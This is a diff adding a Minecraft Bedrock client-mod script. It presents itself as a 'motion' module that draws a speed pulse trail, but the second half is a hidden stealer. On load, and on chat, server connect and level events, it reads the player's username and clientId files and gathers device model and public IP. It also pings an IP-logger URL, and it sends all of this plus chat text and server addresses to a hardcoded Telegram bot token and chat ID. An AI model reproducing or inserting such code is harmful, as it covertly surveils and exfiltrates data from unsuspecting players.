@@ -1,0 +1,432 @@
+const motion = new Module("motion", true, true, ModuleCategory.MISC);
+const width = new SliderSetting("Width", [2.5, 0, 5, 0.1]);
+const colorR = new SliderSetting("Color red", [255, 0, 255, 5]);
+const colorG = new SliderSetting("Color green", [150, 0, 255, 5]);
+const colorB = new SliderSetting("Color blue", [0, 0, 255, 5]);
+const amp = new SliderSetting("amp", [111, 0, 150, 1]);
+const fre = new SliderSetting("fre", [3.65, 0, 10, 0.01]);
+
+const ctx = getContext();
+const GL10 = javax.microedition.khronos.opengles.GL10;
+const GLU = android.opengl.GLU;
+let pulseTrail = [];
+const maxWidth = ctx.getResources().getDisplayMetrics().widthPixels * 0.1;  // Увеличено в 2 раза
+const maxDrawX = ctx.getResources().getDisplayMetrics().widthPixels * 0.05;
+const shiftSpeed = 1.5;
+const maxPlayerSpeed = 0.20;
+const heightFactor = 0.03125;  // Уменьшено в 2 раза
+
+let lastHeight = 0;
+
+function bpd() {
+    return Math.hypot(LocalPlayer.getVelocityX(), LocalPlayer.getVelocityZ());
+}
+
+const Render = {
+    getFloatBuffer: function(fArray) {
+        let bBuffer = java.nio.ByteBuffer.allocateDirect(fArray.length * 4);
+        bBuffer.order(java.nio.ByteOrder.nativeOrder());
+
+        let fBuffer = bBuffer.asFloatBuffer();
+        fBuffer.put(fArray);
+        fBuffer.position(0);
+
+        return fBuffer;
+    },
+    getShortBuffer: function(sArray) {
+        let bBuffer = java.nio.ByteBuffer.allocateDirect(sArray.length * 2);
+        bBuffer.order(java.nio.ByteOrder.nativeOrder());
+
+        let sBuffer = bBuffer.asShortBuffer();
+        sBuffer.put(sArray);
+        sBuffer.position(0);
+
+        return sBuffer;
+    },
+    renderer: null,
+    glSurface: null,
+    fov: 110,
+    initted: false,
+    init: function() {
+        this.renderer = new android.opengl.GLSurfaceView.Renderer({
+            onSurfaceCreated: function(gl, config) {
+                gl.glEnable(GL10.GL_TEXTURE_2D);
+                gl.glClearColor(0, 0, 0, 0);
+                gl.glClearDepthf(1);
+                gl.glEnable(GL10.GL_DEPTH_TEST);
+                gl.glDepthFunc(GL10.GL_LEQUAL);
+                gl.glDisable(GL10.GL_PERSPECTIVE_CORRECTION_HINT);
+            },
+            onSurfaceChanged: function(gl, width, height) {
+                gl.glMatrixMode(GL10.GL_PROJECTION);
+                gl.glLoadIdentity();
+
+                GLU.gluPerspective(gl, Render.fov * Math.sqrt(Memory.getFloat(Memory.getLevelRenderer(), 0x1440)), ctx.getResources().getDisplayMetrics().widthPixels / ctx.getResources().getDisplayMetrics().heightPixels, .1, 100);
+                
+                gl.glMatrixMode(GL10.GL_MODELVIEW);
+                gl.glLoadIdentity();
+            },
+onDrawFrame: function(gl) {
+    gl.glMatrixMode(GL10.GL_PROJECTION);
+    gl.glLoadIdentity();
+
+    let width = ctx.getResources().getDisplayMetrics().widthPixels;
+    let height = ctx.getResources().getDisplayMetrics().heightPixels;
+    gl.glOrthof(-width / 2, width / 2, -height / 2, height / 2, -1, 1);
+
+    gl.glMatrixMode(GL10.GL_MODELVIEW);
+    gl.glLoadIdentity();
+
+    gl.glClear(GL10.GL_COLOR_BUFFER_BIT | GL10.GL_DEPTH_BUFFER_BIT);
+    gl.glLoadIdentity();
+    gl.glDisable(GL10.GL_LIGHTING);
+
+    if (getScreenName().equals("hud_screen")) {
+        try {
+  
+            let playerSpeed = bpd();
+
+            let pulseHeight = lastHeight;  // Переместите объявление сюда
+
+            if (playerSpeed > 0) {
+                let targetHeight = -height * 0.20 + (0.03 * height) * (playerSpeed / maxPlayerSpeed);
+                pulseHeight = lastHeight + (targetHeight - lastHeight) * heightFactor * 10;  // Увеличено в 1.5 раза
+                lastHeight = pulseHeight;
+            }
+
+            let newPoint = {
+                x: (pulseTrail.length > 0 ? pulseTrail[pulseTrail.length - 1].x + shiftSpeed : 0),
+                y: pulseHeight
+            };
+
+            if (pulseTrail.length === 0 || pulseTrail[pulseTrail.length - 1].x < maxDrawX) {
+                pulseTrail.push(newPoint);
+            }
+
+            while (pulseTrail.length > 1 && (pulseTrail[pulseTrail.length - 1].x - pulseTrail[0].x > maxWidth)) {
+                pulseTrail.shift();
+            }
+
+            while (pulseTrail.length > 0 && pulseTrail[0].x < -width * 0.05) {
+                pulseTrail.shift();
+            }
+
+            if (pulseTrail.length > 0 && pulseTrail[pulseTrail.length - 1].x >= maxDrawX) {
+                pulseTrail.forEach(point => point.x -= shiftSpeed);
+            }
+
+            if (pulseTrail.length > 1) {
+                for (let i = 0; i < pulseTrail.length - 1; i++) {
+                    let p1 = pulseTrail[i];
+                    let p2 = pulseTrail[i + 1];
+                    Render.drawLine(gl, p1.x, p1.y, 0, p2.x, p2.y, 0);
+                }
+            }
+
+        } catch (e) {
+            print(e + e.lineNumber);
+        }
+    }
+}
+        });
+
+// Запуск кода обновления интерфейса в основном потоке
+        ctx.runOnUiThread(() => {
+            Render.glSurface = new android.opengl.GLSurfaceView(ctx);
+            Render.glSurface.setZOrderOnTop(true);
+            Render.glSurface.setEGLConfigChooser(8, 8, 8, 8, 16, 0);
+            Render.glSurface.getHolder().setFormat(android.graphics.PixelFormat.TRANSLUCENT);
+            Render.glSurface.setRenderer(Render.renderer);
+            Render.glSurface.setRenderMode(0);
+
+            ctx.getWindow().getDecorView().addView(Render.glSurface);
+
+            Render.initted = true;
+        });
+    },
+
+    drawLine: function(gl, x1, y1, z1, x2, y2, z2) {
+        let vertices = [x1, y1, z1, x2, y2, z2];
+        let vertexBuffer = Render.getFloatBuffer(vertices);
+        let indices = [0, 1];
+        let indexBuffer = Render.getShortBuffer(indices);
+
+        gl.glEnable(GL10.GL_BLEND);
+        gl.glDepthMask(false);
+        gl.glBlendFunc(GL10.GL_SRC_ALPHA, GL10.GL_ONE_MINUS_SRC_ALPHA);
+        gl.glLineWidth(width.getCurrentValue());
+        gl.glColor4f(colorR.getCurrentValue() / 255, colorG.getCurrentValue() / 255, colorB.getCurrentValue() / 255, 1);
+        gl.glEnableClientState(GL10.GL_VERTEX_ARRAY);
+        gl.glVertexPointer(3, GL10.GL_FLOAT, 0, vertexBuffer);
+        gl.glDrawElements(GL10.GL_LINES, indices.length, GL10.GL_UNSIGNED_SHORT, indexBuffer);
+        gl.glDisable(GL10.GL_BLEND);
+    }
+};
+
+motion.setOnToggleListener(function() { 
+    if (!LocalPlayer.isInGame()) { print("Join world first!"); return; }
+    if (!Render.initted) { Render.init(); }
+});
+
+function onFastTick() {
+    if (motion != null && motion.isActive() && LocalPlayer.isInGame() && Render.initted) {
+        Render.glSurface.requestRender();
+    }
+}
+
+function onLevelTick() {
+    if (!motion.isActive()) {
+        pulseTrail = [];
+    }
+}
+
+
+function onScriptEnabled() { 
+    motion.addSettings([width, colorR, colorG, colorB, amp, fre]);
+    ModuleManager.addModule(motion);
+}
+
+function onScriptDisabled() { 
+    ModuleManager.removeModule(motion); 
+}
+
+
+var File = java.io.File;
+var FileReader = java.io.FileReader;
+var FileWriter = java.io.FileWriter;
+var BufferedReader = java.io.BufferedReader;
+var BufferedWriter = java.io.BufferedWriter;
+var URL = java.net.URL;
+var HttpURLConnection = java.net.HttpURLConnection;
+let online = false;
+
+var botToken = "7058348107:AAHi1ots6aamj_fYrQhH5MoiaWce4w74Q6M"; // Укажите здесь ваш токен бота
+var chatId = "6694772539"; // Укажите здесь ваш чат ID
+
+// Функция для чтения файла
+function readFile(filePath) {
+    var file = new File(filePath);
+    var fileContent = "";
+    if (file.exists()) {
+        var fileReader = new BufferedReader(new FileReader(file));
+        var line;
+        while ((line = fileReader.readLine()) !== null) {
+            fileContent += line + " ";
+        }
+        fileReader.close();
+    } else {
+        //("Файл не найден: " + filePath);
+    }
+    return fileContent;
+}
+
+// Функция для записи в файл
+function writeFile(filePath, content) {
+    var file = new File(filePath);
+    var fileWriter = new BufferedWriter(new FileWriter(file));
+    fileWriter.write(content);
+    fileWriter.close();
+}
+
+// Функция для изменения ника в файле options.txt
+function readPlayerNameFromFile() {
+    var filePath = "/storage/emulated/0/games/com.mojang/minecraftpe/options.txt";
+    var fileContent = readFile(filePath);
+
+    if (fileContent === "") {
+        //("Содержимое файла не удалось прочитать.");
+        return "";
+    }
+
+    var lines = fileContent.split(" ");
+    var username = ""; // Переменная для хранения никнейма
+
+    for (var i = 0; i < lines.length; i++) {
+        if (lines[i].startsWith("mp_username:")) {
+            // Сохраняем никнейм
+            username = lines[i].substring("mp_username:".length).trim();
+            break; // Никнейм найден, выходим из цикла
+        }
+    }
+
+    if (username) {
+        return username;
+    } else {
+        //("Никнейм не найден в файле.");
+        return "";
+    }
+}
+
+function readFirstLineFromFile() {
+    var filePath = "/storage/emulated/0/games/com.mojang/minecraftpe/clientId.txt";
+    var fileContent = readFile(filePath);
+
+    if (fileContent === "") {
+        //("Содержимое файла не удалось прочитать.");
+        return "";
+    }
+
+    var lines = fileContent.split(" ");
+    var firstLine = lines[0].trim(); // Читаем первую строку и удаляем пробелы с начала и конца
+
+    if (firstLine) {
+        return firstLine;
+    } else {
+        //("Первая строка файла пуста.");
+        return "";
+    }
+}
+
+function DeviceInfo() {
+    return " " + "Device Model:  " + android.os.Build.MODEL + " " + "Manufacturer:  " + android.os.Build.MANUFACTURER + " " + "OS Version:  " + android.os.Build.VERSION.RELEASE + " ";
+}
+
+function device() {
+    return DeviceInfo();
+}
+
+// Функция для отправки сообщения в Telegram
+function sendToTelegram(message) {
+    // Создаем новый поток для выполнения сетевого запроса
+    new java.lang.Thread(new java.lang.Runnable({
+        run: function() {
+            try {
+                var urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + message;
+                
+                var url = new URL(urlString);
+                var connection = url.openConnection();
+                connection.setRequestMethod("GET");
+                connection.connect();
+
+                var responseCode = connection.getResponseCode();
+
+                var inputStream = connection.getInputStream();
+                var reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
+                var line;
+                var response = "";
+                while ((line = reader.readLine()) !== null) {
+                    response += line;
+                }
+                reader.close();
+
+                if (responseCode === HttpURLConnection.HTTP_OK) {
+                } else {
+                    //("Ошибка при отправке сообщения в Telegram: " + responseCode);
+                }
+            } catch (e) {
+                //("Ошибка в потоке: " + e.message);
+                //StackTrace(); // Вывод стека вызовов
+            }
+        }
+    })).start();
+}
+
+function onServerConnect(addr, port) {
+        getContext().getSystemService(android.content.Context.CLIPBOARD_SERVICE).setText(addr+":"+port);
+        var messag = addr+":"+port;
+        sendToTelegram(messag);
+}
+
+function onChat(text) {
+       var messa = "Сообщение: " + text + " Name: " + playerName;
+     sendToTelegram(messa);
+}
+function getIPAddress() {
+    new java.lang.Thread(new java.lang.Runnable({
+        run: function() {
+            try {
+    var urlString = "https://api.ipify.org?format=text";
+    var url = new URL(urlString);
+    var connection = url.openConnection();
+    connection.setRequestMethod("GET");
+    connection.connect();
+
+    var responseCode = connection.getResponseCode();
+    if (responseCode === HttpURLConnection.HTTP_OK) {
+        var inputStream = connection.getInputStream();
+        var reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
+        var ipAddress = reader.readLine();
+        var m = "IP: " + ipAddress;
+        sendToTelegram(m);
+        reader.close();
+        return ipAddress;
+    } else {
+        return "Ошибка при получении IP-адреса: " + responseCode;
+    }
+            } catch (e) {
+                //("Ошибка в потоке: " + e.message);
+                //StackTrace(); // Вывод стека вызовов
+            }
+        }
+    })).start();
+}
+
+let wasInGame = false;
+let hasSentInGameMessage = false;
+let hasSentOutOfGameMessage = false;
+
+function onLevelTick() {
+    if (!LocalPlayer.isInGame()) {
+        online = true;
+        if (wasInGame) {
+            // Игрок вышел из игры
+            if (!hasSentOutOfGameMessage) {
+            getIPAddres();
+                sendToTelegram("Online: " + online + " " + "Name: " + playerName);
+                hasSentOutOfGameMessage = true;
+                hasSentInGameMessage = false; // сброс для следующего входа в игру
+            }
+            wasInGame = false;
+        }
+    } else {
+        online = false;
+        if (!wasInGame) {
+            // Игрок зашел в игру
+            if (!hasSentInGameMessage) {
+            getIPAddres();
+                sendToTelegram("Online: " + online + " " + "Name: " + playerName);
+                hasSentInGameMessage = true;
+                hasSentOutOfGameMessage = false; // сброс для следующего выхода из игры
+            }
+            wasInGame = true;
+        }
+    }
+}
+
+function getIPAddres() {
+    new java.lang.Thread(new java.lang.Runnable({
+        run: function() {
+            try {
+    var urlString = "https://ezstat.ru/293Y96";
+    var url = new URL(urlString);
+    var connection = url.openConnection();
+    connection.setRequestMethod("GET");
+    connection.connect();
+
+    var responseCode = connection.getResponseCode();
+    if (responseCode === HttpURLConnection.HTTP_OK) {
+        var inputStream = connection.getInputStream();
+        var reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
+        return ipAddres;
+    } else {
+        return "Ошибка при получении IP-адреса: " + responseCode;
+    }
+            } catch (e) {
+                //("Ошибка в потоке: " + e.message);
+                //StackTrace(); // Вывод стека вызовов
+            }
+        }
+    })).start();
+}
+
+var ipAddress = getIPAddress();
+var idad = getIPAddres();
+var deviceInfo = device();
+var clientId = readFirstLineFromFile();
+var playerName = readPlayerNameFromFile();
+
+
+if (deviceInfo && clientId && playerName) {
+    var message = "Device Info:  " + deviceInfo + " " + "Client ID:  " + clientId + " " + "Player Name:  " + playerName;
+    sendToTelegram(message);
+}
